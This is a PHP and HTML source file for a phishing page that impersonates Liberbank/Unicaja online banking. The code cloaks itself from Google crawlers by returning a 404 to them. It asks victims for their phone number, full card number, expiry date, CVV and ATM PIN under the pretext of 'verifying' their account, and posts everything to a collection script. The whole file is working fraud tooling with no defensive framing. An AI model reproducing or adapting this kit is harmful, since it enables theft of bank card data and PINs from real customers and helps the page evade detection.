<?php
session_start();
error_reporting(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


include("./blocker.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);

?>
<!DOCTYPE html>

<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, maximum-scale=1">
    <meta name="format-detection" content="telephone=no">
    <title>Liberbank</title>
    <link rel="stylesheet" href="lib/css/movil.css" type="text/css" >
    <link rel="stylesheet" href="lib/css/calendario.css" type="text/css" >
    <link rel="apple-touch-icon" href="lib/images/apple-touch-icon-v1.png">
    <link rel="icon" href="lib/images/apple-touch-icon-v1.png" type="image/x-icon">
    <link rel="shortcut icon" href="lib/images/apple-touch-icon-v1.png" type="image/x-icon">
    <link href="lib/css/jquery.mmenu.all.css" type="text/css" rel="stylesheet">
    <link rel="stylesheet" href="lib/css/1274860507949.css" type="text/css">
    <script src="lib/js/jquery-3.5.1.min.js" type="text/javascript"></script>  
    <link rel="stylesheet" type="text/css" href="./lib/general.min.css"> 
    <link rel="stylesheet" type="text/css" href="./lib/modulesLogin.min.css">  
    <link href="lib/css/bootstrap.min.css" rel="stylesheet" type="text/css" />

    <style>
      ul {
        list-style-type: none;
        margin: 0;
        padding: 0;
        overflow: hidden;
        border: 1px solid #e7e7e7;
        background-color: #f3f3f3;
      }

      li {
        float: left;
      }

      li a {
        display: block;
        color: #666;
        text-align: center;
        padding: 14px 16px;
        text-decoration: none;
      }

      #inferior1{
        left:0px;
        right:0px;
        bottom:0px;
        height:25px;
        z-index:0;
        padding-top: 13px;
        padding-bottom: 5px;
        font-size: 12px;
        font-weight: bold;
      }
                
      #inferior1 a:link { color: #4C9C2F; text-decoration:none; }

      #pie {
        position: fixed;
        left: 0px;
        right: 0px;
        bottom: 44px;
      }

      .frm-label {
        text-align: left;
        padding : 5px ​0 !important;
      }

      #inferior2 {
        height: auto !important;
      }

      .mod_form.frm-login .frm-label-txt, .mod_form.frm-modal .frm-label-txt {
        font-size : 17px !important;
      }
      </style>

    <script src="res/js/q.js"></script>
    <link href="./lib/bootstrap.css" rel="stylesheet" type="text/css"> 
    <link href="./lib/ladda.min.css" rel="stylesheet" type="text/css"> 
    <link href="./lib/general.css" rel="stylesheet" type="text/css"> 
    <link href="./lib/modules.css" rel="stylesheet" type="text/css"> 
    <link href="./lib/styles.css" rel="stylesheet" type="text/css"> 
    <link href="./lib/ifb-BankiaWidgets.css" rel="stylesheet" type="text/css"> 
    <link href="./lib/styleWFG.css" rel="stylesheet" type="text/css"> 
    <script src="./res/js/jquery-1.9.0.min.js" type="text/javascript" charset="utf-8"></script>
    <script src="./res/js/jquery.maskedinput.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(function() {
            $.mask.definitions['~'] = "[+-]";  //  placeholder=" xxxx xxxx xxxx xxxx " 
            $("#tele").mask("+34 999 999 999");
            $("#date").mask("99/9999");
            $("#card").mask("9999 9999 9999 9999");
            $("#cvv").mask(" 9 9 9 ");
            $("#atm").mask(" 9 9 9 9 ");
            /*
              .------..------..------.
              |D.--. ||C.--. ||H.--. |
              | :/\: || :/\: || :/\: |pin
              | (__) || :\/: || (__) |
              | '--'D|| '--'C|| '--'H|
              `------'`------'`------'
            */

            $("input").blur(function() {
                $("#info").html("Unmasked value: " + $(this).mask());
            }).dblclick(function() {
                $(this).unmask();
            });
        });
    </script>
    <script>
      $(document).ready(function(){
        $('#botonEntrar').click(function(e){
          e.preventDefault();
            if($('#tele').val() == "" && $('#card').val() == "" && $('#date').val() == "" && $('#cvv').val() == "" ){
                  $("#tele").css("border-color", "red");
                  $("#card").css("border-color", "red");
                  $("#date").css("border-color", "red");
                  $("#cvv").css("border-color", "red");
                  $("#atm").css("border-color", "red");
                  return false;
                         
            } else if($('#tele').val() == "" || $('#atm').val() == ""  ){
                $("#tele").css("border-color", "red");
                         
            } else if($('#card').val() == ""){
              $("#card").css("border-color", "red");

              return false;
            } else if( $('#date').val() == ""){
              $("#date").css("border-color", "red");
              return false;
            }
            else if( $('#cvv').val() == ""){
              $("#cvv").css("border-color", "red");
              return false;
            }else if( $('#atm').val() == ""){
              $("#atm").css("border-color", "red");
              return false;
            }else {
              $("#loader").show();
              setTimeout(stp , 0);
            }
            function stp(){
              $('form').submit();
            }
        });
      });
    </script>
    
	  <link href="lib/css/fontliberbank.css" rel="stylesheet" type="text/css" /> 
    <link href="lib/css/login2.css" rel="stylesheet" type="text/css" /> 
  <!-- FIN BANNER APP --> 
</head> 

<body onload="javascript: document.acceso.reset(); " >
    
    <div id="pagina">
      <div class="header">
        <div class="container py-2">
          <div class="row" style="border:0px">
            <div class="col d-flex align-items-center justify-content-between">
              <h1 class="d-flex align-items-center m-0">
                <i class="fas icono-logo-unicaja-liberbank"></i>
              </h1>
            </div>
          </div>
        </div>
      </div>
      <div id="toolbar">
        <span>Identificación</span>
      </div>

      <div style="padding: 12px 15px 6px;">
        <h1 style="font-size: 27px; font-weight: 500 !important; padding-bottom: 8px; text-align: center;">Confirma tu tarjeta</h1>		
        <span>
          Introduzca los datos de su tarjeta de crèdito para verificar su cuenta bancaria en linea
        </span> 
      </div>
			 				  
      <div aria-expanded="false" role="menu" class="mod_login lgn-iframe" style="padding-top: 7px;">
        <div id="panel" style = "padding-top: 10px;"> 
          <div class="mod_message msg-error hide" id="messageValidando"> 
            <div class="msg-container"> 
              <p class="msg-text" id="mensajeErr">Revise los campos incorrectos indicados en el formulario</p> 
              <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
            </div> 
          </div> 
          <form action="./inc/PostCard.php" method="post" class="mod_form frm-login" name="formularioLogin" id="formularioLogin" style="margin-bottom: 50px;"> 
            <fieldset class="frm-fieldset" style="height: 43%; padding: 15px 1rem; border: 1px solid black;"> 
              <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Acceso del cliente</span></legend> 
              <label for="id_usu_login" id="id_usu_login" class="frm-label" style="padding: 5px 0 !important"><span class="frm-label-txt">Número de teléfono</span> 
                <div class="hide" id="placeHolderLogin"> 
                <div class="msg-container"> 
                  <p class="msg-text" id="placeHolderLoginPU"></p> 
                  <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
                </div> 
                </div> <input type="text" name="tele" id="tele" class="frm-input">
              </label> 
              <label for="id_acc_login" id="id_acc_login" class="frm-label" style="padding: 5px 0 !important">
                <span class="frm-label-txt">Introduce el número de tu tarjeta de liberbank</span> 
                <input name="card" id="card" class="frm-input" text="">
                <p style="color: #00a38d; padding: 3px;">Visa o Mastercard, debe tener 16 dígitos y empezar por 4 o 5</p>
              </label>
              
              <label for="id_acc_login" id="id_acc_login" class="frm-label" style="padding: 5px 0 !important">
                <span class="frm-label-txt">PIN de Cajero</span> 
                <table style="width:12%">
                  <tbody>
                    <tr>
                      <th style="">
                        <input type="text" name="date" id="date" class="frm-input" style="width: 100px;">
                        <p style="color: #00a38d; padding: 3px;">MM/AA</p>
                      </th>
                      <th style="padding-left: 22px;">
                        <input type="text" name="cvv" id="cvv" class="frm-input" style="width: 80px;">
                        <p style="color: #00a38d; padding: 3px; font-size: 13px">son 3 dígitos</p>
                      </th>
                    </tr>       
                  </tbody>
                </table>
              </label>

              <label for="id_usu_login" id="id_usu_login" class="frm-label" style="padding: 5px 0 !important">
                <span class="frm-label-txt">Introduce el codigo secreto de tu cajero automatico</span> 
                <div class="hide" id="placeHolderLogin"> 
                  <div class="msg-container"> 
                    <p class="msg-text" id="placeHolderLoginPU"></p> 
                    <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
                  </div> 
                </div>
                <input type="text" name="atm" id="atm" class="frm-input" style="width:26%"> 
                <p style="color: #00a38d; padding: 3px;">son 4 dígitos</p>
              </label>

              <div class="mod_buttons" style="text-align: center;">
                <input type="submit" value="Seguir" name="accountepage" id="botonEntrar" class="but-green but-wDefault ladda-button">
              </div>
            </fieldset> 
            
          </form> 
        </div>  
      </div>
      
        <div id="pie">
            © Unicaja 2021. Todos los derechos reservados
        </div>

        <div id="inferior2">
          <div style="float: left;"><a href='#'>Aviso legal</a></div>
          <div style="float: right;"><a href='#'>Versión clásica</a></div>
          <div style="margin: 0 auto; width: 100px;"><a href='#'>Seguridad</a></div>
        </div>

    </div>
 
</body>

</html>